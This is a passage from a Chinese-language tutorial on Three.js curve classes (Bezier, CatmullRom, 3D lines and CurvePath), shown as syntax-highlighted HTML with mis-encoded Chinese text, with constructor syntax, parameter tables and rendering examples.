  <span class="hljs-keyword">new</span> <span class="hljs-variable constant_">THREE</span>.<span class="hljs-title class_">Vector2</span>(x2, y2), <span class="hljs-comment">// å¿…ä¼ ï¼šæ§åˆ¶ç‚¹ï¼ˆå†³å®šå¼¯æ›²æ–¹å‘ï¼‰</span>
  <span class="hljs-keyword">new</span> <span class="hljs-variable constant_">THREE</span>.<span class="hljs-title class_">Vector2</span>(x3, y3)  <span class="hljs-comment">// å¿…ä¼ ï¼šç»ˆç‚¹</span>
);
</code></pre>

























<table><thead><tr><th>å‚æ•°</th><th>ç±»å‹</th><th>è¯´æ˜</th></tr></thead><tbody><tr><td><code>v0</code></td><td>THREE.Vector2</td><td>èµ·ç‚¹</td></tr><tr><td><code>v1</code></td><td>THREE.Vector2</td><td>æ§åˆ¶ç‚¹ï¼ˆæ ¸å¿ƒï¼Œå†³å®šæ›²çº¿å½¢çŠ¶ï¼‰</td></tr><tr><td><code>v2</code></td><td>THREE.Vector2</td><td>ç»ˆç‚¹</td></tr></tbody></table>
<h5 data-id="heading-23">ä½¿ç”¨ç¤ºä¾‹</h5>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// 1. åˆ›å»ºäºŒæ¬¡è´å¡å°”æ›²çº¿</span>
<span class="hljs-keyword">const</span> quadBezier = <span class="hljs-keyword">new</span> <span class="hljs-variable constant_">THREE</span>.<span class="hljs-title class_">QuadraticBezierCurve</span>(
  <span class="hljs-keyword">new</span> <span class="hljs-variable constant_">THREE</span>.<span class="hljs-title class_">Vector2</span>(-<span class="hljs-number">80</span>, <span class="hljs-number">0</span>),  <span class="hljs-comment">// èµ·ç‚¹</span>
  <span class="hljs-keyword">new</span> <span class="hljs-variable constant_">THREE</span>.<span class="hljs-title class_">Vector2</span>(<span class="hljs-number">0</span>, <span class="hljs-number">80</span>),   <span class="hljs-comment">// æ§åˆ¶ç‚¹ï¼ˆå‘ä¸Šå¼¯æ›²ï¼‰</span>
  <span class="hljs-keyword">new</span> <span class="hljs-variable constant_">THREE</span>.<span class="hljs-title class_">Vector2</span>(<span class="hljs-number">80</span>, <span class="hljs-number">0</span>)    <span class="hljs-comment">// ç»ˆç‚¹</span>
);

<span class="hljs-comment">// 2. é‡‡æ ·é¡¶ç‚¹</span>
<span class="hljs-keyword">const</span> points = quadBezier.<span class="hljs-title function_">getPoints</span>(<span class="hljs-number">80</span>);

<span class="hljs-comment">// 3. æ¸²æŸ“</span>
<span class="hljs-keyword">const</span> geometry = <span class="hljs-keyword">new</span> <span class="hljs-variable constant_">THREE</span>.<span class="hljs-title class_">BufferGeometry</span>();
geometry.<span class="hljs-title function_">setFromPoints</span>(points);
<span class="hljs-keyword">const</span> material = <span class="hljs-keyword">new</span> <span class="hljs-variable constant_">THREE</span>.<span class="hljs-title class_">LineBasicMaterial</span>({ <span class="hljs-attr">color</span>: <span class="hljs-number">0xffff00</span> });
<span class="hljs-keyword">const</span> line = <span class="hljs-keyword">new</span> <span class="hljs-variable constant_">THREE</span>.<span class="hljs-title class_">Line</span>(geometry, material);
scene.<span class="hljs-title function_">add</span>(line);
</code></pre>
<h4 data-id="heading-24">6. CubicBezierCurveï¼ˆ2Dä¸‰æ¬¡è´å¡å°”æ›²çº¿ï¼‰</h4>
<h5 data-id="heading-25">æ ¸å¿ƒè¯´æ˜</h5>
<p>ç”±ã€Œèµ·ç‚¹+æ§åˆ¶ç‚¹1+æ§åˆ¶ç‚¹2+ç»ˆç‚¹ã€4ä¸ªç‚¹å®šä¹‰çš„2Dè´å¡å°”æ›²çº¿ï¼ŒåŒæ›²ç‡ï¼Œé€‚åˆå¤æ‚å¼¯æ›²ï¼ˆå¦‚å­—ä½“è½®å»“ã€è·¯å¾„åŠ¨ç”»ï¼‰ã€‚</p>
<h5 data-id="heading-26">æ„é€ å‡½æ•°å‚æ•°</h5>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// è¯­æ³•ï¼šnew THREE.CubicBezierCurve(èµ·ç‚¹, æ§åˆ¶ç‚¹1, æ§åˆ¶ç‚¹2, ç»ˆç‚¹)</span>
<span class="hljs-keyword">const</span> cubicBezier = <span class="hljs-keyword">new</span> <span class="hljs-variable constant_">THREE</span>.<span class="hljs-title class_">CubicBezierCurve</span>(
  <span class="hljs-keyword">new</span> <span class="hljs-variable constant_">THREE</span>.<span class="hljs-title class_">Vector2</span>(x1, y1), <span class="hljs-comment">// å¿…ä¼ ï¼šèµ·ç‚¹</span>
  <span class="hljs-keyword">new</span> <span class="hljs-variable constant_">THREE</span>.<span class="hljs-title class_">Vector2</span>(x2, y2), <span class="hljs-comment">// å¿…ä¼ ï¼šæ§åˆ¶ç‚¹1</span>
  <span class="hljs-keyword">new</span> <span class="hljs-variable constant_">THREE</span>.<span class="hljs-title class_">Vector2</span>(x3, y3), <span class="hljs-comment">// å¿…ä¼ ï¼šæ§åˆ¶ç‚¹2</span>
  <span class="hljs-keyword">new</span> <span class="hljs-variable constant_">THREE</span>.<span class="hljs-title class_">Vector2</span>(x4, y4)  <span class="hljs-comment">// å¿…ä¼ ï¼šç»ˆç‚¹</span>
);
</code></pre>






























<table><thead><tr><th>å‚æ•°</th><th>ç±»å‹</th><th>è¯´æ˜</th></tr></thead><tbody><tr><td><code>v0</code></td><td>THREE.Vector2</td><td>èµ·ç‚¹</td></tr><tr><td><code>v1</code></td><td>THREE.Vector2</td><td>æ§åˆ¶ç‚¹1ï¼ˆå·¦ä¾§å¼¯æ›²ï¼‰</td></tr><tr><td><code>v2</code></td><td>THREE.Vector2</td><td>æ§åˆ¶ç‚¹2ï¼ˆå³ä¾§å¼¯æ›²ï¼‰</td></tr><tr><td><code>v3</code></td><td>THREE.Vector2</td><td>ç»ˆç‚¹</td></tr></tbody></table>
<h5 data-id="heading-27">ä½¿ç”¨ç¤ºä¾‹</h5>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// 1. åˆ›å»ºä¸‰æ¬¡è´å¡å°”æ›²çº¿</span>
<span class="hljs-keyword">const</span> cubicBezier = <span class="hljs-keyword">new</span> <span class="hljs-variable constant_">THREE</span>.<span class="hljs-title class_">CubicBezierCurve</span>(
  <span class="hljs-keyword">new</span> <span class="hljs-variable constant_">THREE</span>.<span class="hljs-title class_">Vector2</span>(-<span class="hljs-number">100</span>, <span class="hljs-number">0</span>), <span class="hljs-comment">// èµ·ç‚¹</span>
  <span class="hljs-keyword">new</span> <span class="hljs-variable constant_">THREE</span>.<span class="hljs-title class_">Vector2</span>(-<span class="hljs-number">50</span>, <span class="hljs-number">100</span>),<span class="hljs-comment">// æ§åˆ¶ç‚¹1ï¼ˆå‘ä¸Šï¼‰</span>
  <span class="hljs-keyword">new</span> <span class="hljs-variable constant_">THREE</span>.<span class="hljs-title class_">Vector2</span>(<span class="hljs-number">50</span>, -<span class="hljs-number">100</span>),<span class="hljs-comment">// æ§åˆ¶ç‚¹2ï¼ˆå‘ä¸‹ï¼‰</span>
  <span class="hljs-keyword">new</span> <span class="hljs-variable constant_">THREE</span>.<span class="hljs-title class_">Vector2</span>(<span class="hljs-number">100</span>, <span class="hljs-number">0</span>)   <span class="hljs-comment">// ç»ˆç‚¹</span>
);

<span class="hljs-comment">// 2. é‡‡æ ·é¡¶ç‚¹</span>
<span class="hljs-keyword">const</span> points = cubicBezier.<span class="hljs-title function_">getPoints</span>(<span class="hljs-number">100</span>);

<span class="hljs-comment">// 3. æ¸²æŸ“</span>
<span class="hljs-keyword">const</span> geometry = <span class="hljs-keyword">new</span> <span class="hljs-variable constant_">THREE</span>.<span class="hljs-title class_">BufferGeometry</span>();
geometry.<span class="hljs-title function_">setFromPoints</span>(points);
<span class="hljs-keyword">const</span> material = <span class="hljs-keyword">new</span> <span class="hljs-variable constant_">THREE</span>.<span class="hljs-title class_">LineBasicMaterial</span>({ <span class="hljs-attr">color</span>: <span class="hljs-number">0xff00ff</span> });
<span class="hljs-keyword">const</span> line = <span class="hljs-keyword">new</span> <span class="hljs-variable constant_">THREE</span>.<span class="hljs-title class_">Line</span>(geometry, material);
scene.<span class="hljs-title function_">add</span>(line);
</code></pre>
<hr/>
<h3 data-id="heading-28">äºŒã€3Dæ›²çº¿ï¼ˆXYZä¸‰ç»´ç©ºé—´ï¼‰</h3>
<p>3Dæ›²çº¿çªç ´XYå¹³é¢é™åˆ¶ï¼Œæ”¯æŒXYZä¸‰ç»´åæ ‡ï¼Œæ ¸å¿ƒç”¨äº3Dè·¯å¾„ï¼ˆå¦‚é£è¡Œè½¨è¿¹ã€ç®¡é“æ¨¡å‹ï¼‰ã€‚</p>
<h4 data-id="heading-29">1. LineCurve3ï¼ˆ3Dç›´çº¿ï¼‰</h4>
<h5 data-id="heading-30">æ ¸å¿ƒè¯´æ˜</h5>
<p>ä¸¤ç‚¹ç¡®å®šçš„3Dç›´çº¿ï¼ŒZåæ ‡å¯è‡ªå®šä¹‰ï¼Œæ˜¯3Dæœ€åŸºç¡€çš„æ›²çº¿ã€‚</p>
<h5 data-id="heading-31">æ„é€ å‡½æ•°å‚æ•°</h5>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// è¯­æ³•ï¼šnew THREE.LineCurve3(èµ·ç‚¹å‘é‡, ç»ˆç‚¹å‘é‡)</span>
<span class="hljs-keyword">const</span> lineCurve3 = <span class="hljs-keyword">new</span> <span class="hljs-variable constant_">THREE</span>.<span class="hljs-title class_">LineCurve3</span>(
  <span class="hljs-keyword">new</span> <span class="hljs-variable constant_">THREE</span>.<span class="hljs-title class_">Vector3</span>(x1, y1, z1), <span class="hljs-comment">// å¿…ä¼ ï¼š3Dèµ·ç‚¹</span>
  <span class="hljs-keyword">new</span> <span class="hljs-variable constant_">THREE</span>.<span class="hljs-title class_">Vector3</span>(x2, y2, z2)  <span class="hljs-comment">// å¿…ä¼ ï¼š3Dç»ˆç‚¹</span>
);
</code></pre>




















<table><thead><tr><th>å‚æ•°</th><th>ç±»å‹</th><th>è¯´æ˜</th></tr></thead><tbody><tr><td><code>v1</code></td><td>THREE.Vector3</td><td>3Dèµ·ç‚¹ï¼ˆXYZåæ ‡ï¼‰</td></tr><tr><td><code>v2</code></td><td>THREE.Vector3</td><td>3Dç»ˆç‚¹ï¼ˆXYZåæ ‡ï¼‰</td></tr></tbody></table>
<h5 data-id="heading-32">ä½¿ç”¨ç¤ºä¾‹</h5>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// 1. åˆ›å»º3Dç›´çº¿ï¼ˆä»(0,0,0)åˆ°(100, 50, 80)ï¼‰</span>
<span class="hljs-keyword">const</span> lineCurve3 = <span class="hljs-keyword">new</span> <span class="hljs-variable constant_">THREE</span>.<span class="hljs-title class_">LineCurve3</span>(
  <span class="hljs-keyword">new</span> <span class="hljs-variable constant_">THREE</span>.<span class="hljs-title class_">Vector3</span>(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>),
  <span class="hljs-keyword">new</span> <span class="hljs-variable constant_">THREE</span>.<span class="hljs-title class_">Vector3</span>(<span class="hljs-number">100</span>, <span class="hljs-number">50</span>, <span class="hljs-number">80</span>)
);

<span class="hljs-comment">// 2. é‡‡æ ·é¡¶ç‚¹</span>
<span class="hljs-keyword">const</span> points = lineCurve3.<span class="hljs-title function_">getPoints</span>(<span class="hljs-number">50</span>);

<span class="hljs-comment">// 3. æ¸²æŸ“</span>
<span class="hljs-keyword">const</span> geometry = <span class="hljs-keyword">new</span> <span class="hljs-variable constant_">THREE</span>.<span class="hljs-title class_">BufferGeometry</span>();
geometry.<span class="hljs-title function_">setFromPoints</span>(points);
<span class="hljs-keyword">const</span> material = <span class="hljs-keyword">new</span> <span class="hljs-variable constant_">THREE</span>.<span class="hljs-title class_">LineBasicMaterial</span>({ <span class="hljs-attr">color</span>: <span class="hljs-number">0x00ff00</span> });
<span class="hljs-keyword">const</span> line = <span class="hljs-keyword">new</span> <span class="hljs-variable constant_">THREE</span>.<span class="hljs-title class_">Line</span>(geometry, material);
scene.<span class="hljs-title function_">add</span>(line);
</code></pre>
<h4 data-id="heading-33">2. CatmullRomCurve3ï¼ˆ3Dæ ·æ¡æ›²çº¿ï¼‰</h4>
<h5 data-id="heading-34">æ ¸å¿ƒè¯´æ˜</h5>
<p>Three.jså®˜æ–¹æ¨èçš„3Dæ ·æ¡æ›²çº¿ï¼ˆæ›¿ä»£SplineCurve3ï¼‰ï¼Œé€šè¿‡å¤šä¸ª3Dæ§åˆ¶ç‚¹ç”Ÿæˆå¹³æ»‘æ›²çº¿ï¼Œæ›²çº¿ç©¿è¿‡æ‰€æœ‰æ§åˆ¶ç‚¹ï¼Œé€‚åˆ3Dè·¯å¾„è§„åˆ’ã€‚</p>
<h5 data-id="heading-35">æ„é€ å‡½æ•°å‚æ•°</h5>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// è¯­æ³•ï¼šnew THREE.CatmullRomCurve3(æ§åˆ¶ç‚¹æ•°ç»„, æ˜¯å¦é—­åˆ, æ›²çº¿ç±»å‹, å¼ åŠ›)</span>
<span class="hljs-keyword">const</span> catmullCurve = <span class="hljs-keyword">new</span> <span class="hljs-variable constant_">THREE</span>.<span class="hljs-title class_">CatmullRomCurve3</span>(
  [
    <span class="hljs-keyword">new</span> <span class="hljs-variable constant_">THREE</span>.<span class="hljs-title class_">Vector3</span>(x1, y1, z1),
    <span class="hljs-keyword">new</span> <span class="hljs-variable constant_">THREE</span>.<span class="hljs-title class_">Vector3</span>(x2, y2, z2),
    <span class="hljs-comment">// ... æ›´å¤šæ§åˆ¶ç‚¹</span>
  ],
  <span class="hljs-literal">false</span>,       <span class="hljs-comment">// å¯é€‰ï¼šæ˜¯å¦é—­åˆï¼Œé»˜è®¤false</span>
  <span class="hljs-string">'centripetal'</span>,<span class="hljs-comment">// å¯é€‰ï¼šæ›²çº¿ç±»å‹ï¼Œé»˜è®¤'centripetal'</span>
  <span class="hljs-number">0.5</span>          <span class="hljs-comment">// å¯é€‰ï¼šå¼ åŠ›ï¼ˆ0~1ï¼‰ï¼Œé»˜è®¤0.5ï¼Œå€¼è¶Šå¤§æ›²çº¿è¶Šå¹³ç¼“</span>
);
</code></pre>



































<table><thead><tr><th>å‚æ•°</th><th>ç±»å‹</th><th>é»˜è®¤å€¼</th><th>è¯´æ˜</th></tr></thead><tbody><tr><td><code>points</code></td><td>Array&lt;THREE.Vector3&gt;</td><td>â€”</td><td>å¿…ä¼ ï¼š3Dæ§åˆ¶ç‚¹æ•°ç»„ï¼ˆè‡³å°‘2ä¸ªï¼‰</td></tr><tr><td><code>closed</code></td><td>Boolean</td><td>false</td><td>æ˜¯å¦é—­åˆæ›²çº¿</td></tr><tr><td><code>type</code></td><td>String</td><td>'centripetal'</td><td>æ›²çº¿ç±»å‹ï¼š'centripetal'ï¼ˆé»˜è®¤ï¼Œè‡ªç„¶ï¼‰ã€'chordal'ï¼ˆæ›´ç´§ç»·ï¼‰ã€'catmullrom'ï¼ˆæ›´å¹³æ»‘ï¼‰</td></tr><tr><td><code>tension</code></td><td>Number</td><td>0.5</td><td>å¼ åŠ›ï¼ˆ0=æ— å¼ åŠ›ï¼Œ1=æœ€å¤§å¼ åŠ›ï¼‰</td></tr></tbody></table>
<h5 data-id="heading-36">ä½¿ç”¨ç¤ºä¾‹</h5>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// 1. åˆ›å»º3Dæ ·æ¡æ›²çº¿ï¼ˆ4ä¸ªæ§åˆ¶ç‚¹ï¼Œç©ºé—´å¼¯æ›²ï¼‰</span>
<span class="hljs-keyword">const</span> catmullCurve = <span class="hljs-keyword">new</span> <span class="hljs-variable constant_">THREE</span>.<span class="hljs-title class_">CatmullRomCurve3</span>([
  <span class="hljs-keyword">new</span> <span class="hljs-variable constant_">THREE</span>.<span class="hljs-title class_">Vector3</span>(-<span class="hljs-number">100</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>),   <span class="hljs-comment">// æ§åˆ¶ç‚¹1</span>
  <span class="hljs-keyword">new</span> <span class="hljs-variable constant_">THREE</span>.<span class="hljs-title class_">Vector3</span>(-<span class="hljs-number">50</span>, <span class="hljs-number">80</span>, <span class="hljs-number">50</span>),  <span class="hljs-comment">// æ§åˆ¶ç‚¹2</span>
  <span class="hljs-keyword">new</span> <span class="hljs-variable constant_">THREE</span>.<span class="hljs-title class_">Vector3</span>(<span class="hljs-number">50</span>, -<span class="hljs-number">80</span>, <span class="hljs-number">100</span>), <span class="hljs-comment">// æ§åˆ¶ç‚¹3</span>
  <span class="hljs-keyword">new</span> <span class="hljs-variable constant_">THREE</span>.<span class="hljs-title class_">Vector3</span>(<span class="hljs-number">100</span>, <span class="hljs-number">0</span>, <span class="hljs-number">50</span>)    <span class="hljs-comment">// æ§åˆ¶ç‚¹4</span>
]);

<span class="hljs-comment">// 2. é‡‡æ ·é¡¶ç‚¹ï¼ˆ100ä¸ªç‚¹ï¼Œä¿è¯3Då¹³æ»‘ï¼‰</span>
<span class="hljs-keyword">const</span> points = catmullCurve.<span class="hljs-title function_">getPoints</span>(<span class="hljs-number">100</span>);

<span class="hljs-comment">// 3. æ¸²æŸ“</span>
<span class="hljs-keyword">const</span> geometry = <span class="hljs-keyword">new</span> <span class="hljs-variable constant_">THREE</span>.<span class="hljs-title class_">BufferGeometry</span>();
geometry.<span class="hljs-title function_">setFromPoints</span>(points);
<span class="hljs-keyword">const</span> material = <span class="hljs-keyword">new</span> <span class="hljs-variable constant_">THREE</span>.<span class="hljs-title class_">LineBasicMaterial</span>({ <span class="hljs-attr">color</span>: <span class="hljs-number">0x0000ff</span> });
<span class="hljs-keyword">const</span> line = <span class="hljs-keyword">new</span> <span class="hljs-variable constant_">THREE</span>.<span class="hljs-title class_">Line</span>(geometry, material);
scene.<span class="hljs-title function_">add</span>(line);
</code></pre>
<h4 data-id="heading-37">3. QuadraticBezierCurve3ï¼ˆ3DäºŒæ¬¡è´å¡å°”æ›²çº¿ï¼‰</h4>
<h5 data-id="heading-38">æ ¸å¿ƒè¯´æ˜</h5>
<p>3Dç‰ˆæœ¬çš„äºŒæ¬¡è´å¡å°”æ›²çº¿ï¼Œç”±ã€Œ3Dèµ·ç‚¹+3Dæ§åˆ¶ç‚¹+3Dç»ˆç‚¹ã€å®šä¹‰ï¼Œæ”¯æŒç©ºé—´å¼¯æ›²ã€‚</p>
<h5 data-id="heading-39">æ„é€ å‡½æ•°å‚æ•°</h5>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// è¯­æ³•ï¼šnew THREE.QuadraticBezierCurve3(èµ·ç‚¹, æ§åˆ¶ç‚¹, ç»ˆç‚¹)</span>
<span class="hljs-keyword">const</span> quadBezier3 = <span class="hljs-keyword">new</span> <span class="hljs-variable constant_">THREE</span>.<span class="hljs-title class_">QuadraticBezierCurve3</span>(
  <span class="hljs-keyword">new</span> <span class="hljs-variable constant_">THREE</span>.<span class="hljs-title class_">Vector3</span>(x1, y1, z1), <span class="hljs-comment">// å¿…ä¼ ï¼š3Dèµ·ç‚¹</span>
  <span class="hljs-keyword">new</span> <span class="hljs-variable constant_">THREE</span>.<span class="hljs-title class_">Vector3</span>(x2, y2, z2), <span class="hljs-comment">// å¿…ä¼ ï¼š3Dæ§åˆ¶ç‚¹</span>
  <span class="hljs-keyword">new</span> <span class="hljs-variable constant_">THREE</span>.<span class="hljs-title class_">Vector3</span>(x3, y3, z3)  <span class="hljs-comment">// å¿…ä¼ ï¼š3Dç»ˆç‚¹</span>
);
</code></pre>

























<table><thead><tr><th>å‚æ•°</th><th>ç±»å‹</th><th>è¯´æ˜</th></tr></thead><tbody><tr><td><code>v0</code></td><td>THREE.Vector3</td><td>3Dèµ·ç‚¹</td></tr><tr><td><code>v1</code></td><td>THREE.Vector3</td><td>3Dæ§åˆ¶ç‚¹ï¼ˆå†³å®šç©ºé—´å¼¯æ›²æ–¹å‘ï¼‰</td></tr><tr><td><code>v2</code></td><td>THREE.Vector3</td><td>3Dç»ˆç‚¹</td></tr></tbody></table>
<h5 data-id="heading-40">ä½¿ç”¨ç¤ºä¾‹</h5>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// 1. åˆ›å»º3DäºŒæ¬¡è´å¡å°”æ›²çº¿</span>
<span class="hljs-keyword">const</span> quadBezier3 = <span class="hljs-keyword">new</span> <span class="hljs-variable constant_">THREE</span>.<span class="hljs-title class_">QuadraticBezierCurve3</span>(
  <span class="hljs-keyword">new</span> <span class="hljs-variable constant_">THREE</span>.<span class="hljs-title class_">Vector3</span>(-<span class="hljs-number">80</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>),   <span class="hljs-comment">// èµ·ç‚¹</span>
  <span class="hljs-keyword">new</span> <span class="hljs-variable constant_">THREE</span>.<span class="hljs-title class_">Vector3</span>(<span class="hljs-number">0</span>, <span class="hljs-number">80</span>, <span class="hljs-number">50</span>),   <span class="hljs-comment">// æ§åˆ¶ç‚¹ï¼ˆZè½´åç§»ï¼‰</span>
  <span class="hljs-keyword">new</span> <span class="hljs-variable constant_">THREE</span>.<span class="hljs-title class_">Vector3</span>(<span class="hljs-number">80</span>, <span class="hljs-number">0</span>, <span class="hljs-number">100</span>)   <span class="hljs-comment">// ç»ˆç‚¹</span>
);

<span class="hljs-comment">// 2. é‡‡æ ·é¡¶ç‚¹</span>
<span class="hljs-keyword">const</span> points = quadBezier3.<span class="hljs-title function_">getPoints</span>(<span class="hljs-number">80</span>);

<span class="hljs-comment">// 3. æ¸²æŸ“</span>
<span class="hljs-keyword">const</span> geometry = <span class="hljs-keyword">new</span> <span class="hljs-variable constant_">THREE</span>.<span class="hljs-title class_">BufferGeometry</span>();
geometry.<span class="hljs-title function_">setFromPoints</span>(points);
<span class="hljs-keyword">const</span> material = <span class="hljs-keyword">new</span> <span class="hljs-variable constant_">THREE</span>.<span class="hljs-title class_">LineBasicMaterial</span>({ <span class="hljs-attr">color</span>: <span class="hljs-number">0xffff00</span> });
<span class="hljs-keyword">const</span> line = <span class="hljs-keyword">new</span> <span class="hljs-variable constant_">THREE</span>.<span class="hljs-title class_">Line</span>(geometry, material);
scene.<span class="hljs-title function_">add</span>(line);
</code></pre>
<h4 data-id="heading-41">4. CubicBezierCurve3ï¼ˆ3Dä¸‰æ¬¡è´å¡å°”æ›²çº¿ï¼‰</h4>
<h5 data-id="heading-42">æ ¸å¿ƒè¯´æ˜</h5>
<p>3Dç‰ˆæœ¬çš„ä¸‰æ¬¡è´å¡å°”æ›²çº¿ï¼Œç”±4ä¸ª3Dç‚¹å®šä¹‰ï¼Œæ”¯æŒå¤æ‚ç©ºé—´å¼¯æ›²ï¼Œæ˜¯3Dè·¯å¾„åŠ¨ç”»çš„æ ¸å¿ƒæ›²çº¿ã€‚</p>
<h5 data-id="heading-43">æ„é€ å‡½æ•°å‚æ•°</h5>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// è¯­æ³•ï¼šnew THREE.CubicBezierCurve3(èµ·ç‚¹, æ§åˆ¶ç‚¹1, æ§åˆ¶ç‚¹2, ç»ˆç‚¹)</span>
<span class="hljs-keyword">const</span> cubicBezier3 = <span class="hljs-keyword">new</span> <span class="hljs-variable constant_">THREE</span>.<span class="hljs-title class_">CubicBezierCurve3</span>(
  <span class="hljs-keyword">new</span> <span class="hljs-variable constant_">THREE</span>.<span class="hljs-title class_">Vector3</span>(x1, y1, z1), <span class="hljs-comment">// å¿…ä¼ ï¼š3Dèµ·ç‚¹</span>
  <span class="hljs-keyword">new</span> <span class="hljs-variable constant_">THREE</span>.<span class="hljs-title class_">Vector3</span>(x2, y2, z2), <span class="hljs-comment">// å¿…ä¼ ï¼š3Dæ§åˆ¶ç‚¹1</span>
  <span class="hljs-keyword">new</span> <span class="hljs-variable constant_">THREE</span>.<span class="hljs-title class_">Vector3</span>(x3, y3, z3), <span class="hljs-comment">// å¿…ä¼ ï¼š3Dæ§åˆ¶ç‚¹2</span>
  <span class="hljs-keyword">new</span> <span class="hljs-variable constant_">THREE</span>.<span class="hljs-title class_">Vector3</span>(x4, y4, z4)  <span class="hljs-comment">// å¿…ä¼ ï¼š3Dç»ˆç‚¹</span>
);
</code></pre>






























<table><thead><tr><th>å‚æ•°</th><th>ç±»å‹</th><th>è¯´æ˜</th></tr></thead><tbody><tr><td><code>v0</code></td><td>THREE.Vector3</td><td>3Dèµ·ç‚¹</td></tr><tr><td><code>v1</code></td><td>THREE.Vector3</td><td>3Dæ§åˆ¶ç‚¹1</td></tr><tr><td><code>v2</code></td><td>THREE.Vector3</td><td>3Dæ§åˆ¶ç‚¹2</td></tr><tr><td><code>v3</code></td><td>THREE.Vector3</td><td>3Dç»ˆç‚¹</td></tr></tbody></table>
<h5 data-id="heading-44">ä½¿ç”¨ç¤ºä¾‹</h5>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// 1. åˆ›å»º3Dä¸‰æ¬¡è´å¡å°”æ›²çº¿</span>
<span class="hljs-keyword">const</span> cubicBezier3 = <span class="hljs-keyword">new</span> <span class="hljs-variable constant_">THREE</span>.<span class="hljs-title class_">CubicBezierCurve3</span>(
  <span class="hljs-keyword">new</span> <span class="hljs-variable constant_">THREE</span>.<span class="hljs-title class_">Vector3</span>(-<span class="hljs-number">100</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>),  <span class="hljs-comment">// èµ·ç‚¹</span>
  <span class="hljs-keyword">new</span> <span class="hljs-variable constant_">THREE</span>.<span class="hljs-title class_">Vector3</span>(-<span class="hljs-number">50</span>, <span class="hljs-number">100</span>, <span class="hljs-number">50</span>),<span class="hljs-comment">// æ§åˆ¶ç‚¹1</span>
  <span class="hljs-keyword">new</span> <span class="hljs-variable constant_">THREE</span>.<span class="hljs-title class_">Vector3</span>(<span class="hljs-number">50</span>, -<span class="hljs-number">100</span>, <span class="hljs-number">80</span>),<span class="hljs-comment">// æ§åˆ¶ç‚¹2</span>
  <span class="hljs-keyword">new</span> <span class="hljs-variable constant_">THREE</span>.<span class="hljs-title class_">Vector3</span>(<span class="hljs-number">100</span>, <span class="hljs-number">0</span>, <span class="hljs-number">100</span>)  <span class="hljs-comment">// ç»ˆç‚¹</span>
);

<span class="hljs-comment">// 2. é‡‡æ ·é¡¶ç‚¹</span>
<span class="hljs-keyword">const</span> points = cubicBezier3.<span class="hljs-title function_">getPoints</span>(<span class="hljs-number">100</span>);

<span class="hljs-comment">// 3. æ¸²æŸ“</span>
<span class="hljs-keyword">const</span> geometry = <span class="hljs-keyword">new</span> <span class="hljs-variable constant_">THREE</span>.<span class="hljs-title class_">BufferGeometry</span>();
geometry.<span class="hljs-title function_">setFromPoints</span>(points);
<span class="hljs-keyword">const</span> material = <span class="hljs-keyword">new</span> <span class="hljs-variable constant_">THREE</span>.<span class="hljs-title class_">LineBasicMaterial</span>({ <span class="hljs-attr">color</span>: <span class="hljs-number">0xff00ff</span> });
<span class="hljs-keyword">const</span> line = <span class="hljs-keyword">new</span> <span class="hljs-variable constant_">THREE</span>.<span class="hljs-title class_">Line</span>(geometry, material);
scene.<span class="hljs-title function_">add</span>(line);
</code></pre>
<hr/>
<h3 data-id="heading-45">ä¸‰ã€CurvePathï¼ˆç»„åˆæ›²çº¿ï¼‰</h3>
<h5 data-id="heading-46">æ ¸å¿ƒè¯´æ˜</h5>
<p><code>CurvePath</code> æ˜¯ã€Œæ›²çº¿å®¹å™¨ã€ï¼Œå¯å°†å¤šä¸ª2D/3Dæ›²çº¿ç»„åˆæˆä¸€ä¸ªå¤åˆæ›²çº¿ï¼Œæ”¯æŒç»Ÿä¸€é‡‡æ ·ã€å¹³ç§»ã€æ—‹è½¬ç­‰æ“ä½œï¼Œé€‚åˆç»˜åˆ¶å¤æ‚è·¯å¾„ï¼ˆå¦‚è¿·å®«ã€æ–‡å­—è½®å»“ï¼‰ã€‚</p>
<h5 data-id="heading-47">æ ¸å¿ƒæ–¹æ³•</h5>

























<table><thead><tr><th>æ–¹æ³•å</th><th>è¯´æ˜</th><th>ç¤ºä¾‹</th></tr></thead><tbody><tr><td><code>add(curve)</code></td><td>æ·»åŠ å•ä¸ªæ›²çº¿åˆ°å®¹å™¨</td><td><code>curvePath.add(lineCurve)</code></td></tr><tr><td><code>getPoints(n)</code></td><td>ç»Ÿä¸€é‡‡æ ·æ‰€æœ‰æ›²çº¿çš„é¡¶ç‚¹</td><td><code>curvePath.getPoints(100)</code></td></tr><tr><td><code>closePath()</code></td><td>é—­åˆç»„åˆæ›²çº¿ï¼ˆæœ€åä¸€ä¸ªæ›²çº¿ç»ˆç‚¹è¿æ¥ç¬¬ä¸€ä¸ªæ›²çº¿èµ·ç‚¹ï¼‰</td><td><code>curvePath.closePath()</code></td></tr></tbody></table>
<h5 data-id="heading-48">ä½¿ç”¨ç¤ºä¾‹ï¼ˆç»„åˆ2Dç›´çº¿+åœ†å¼§ï¼‰</h5>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// 1. åˆ›å»ºCurvePathå®¹å™¨</span>
<span class="hljs-keyword">const</span> curvePath = <span class="hljs-keyword">new</span> <span class="hljs-variable constant_">THREE</span>.<span class="hljs-title class_">CurvePath</span>();

<span class="hljs-comment">// 2. æ·»åŠ å­æ›²çº¿ï¼ˆç›´çº¿+åœ†å¼§ï¼‰</span>
<span class="hljs-comment">// å­æ›²çº¿1ï¼š2Dç›´çº¿ï¼ˆä»(0,0)åˆ°(100,0)ï¼‰</span>
<span class="hljs-keyword">const</span> lineCurve = <span class="hljs-keyword">new</span> <span class="hljs-variable constant_">THREE</span>.<span class="hljs-title class_">LineCurve</span>(
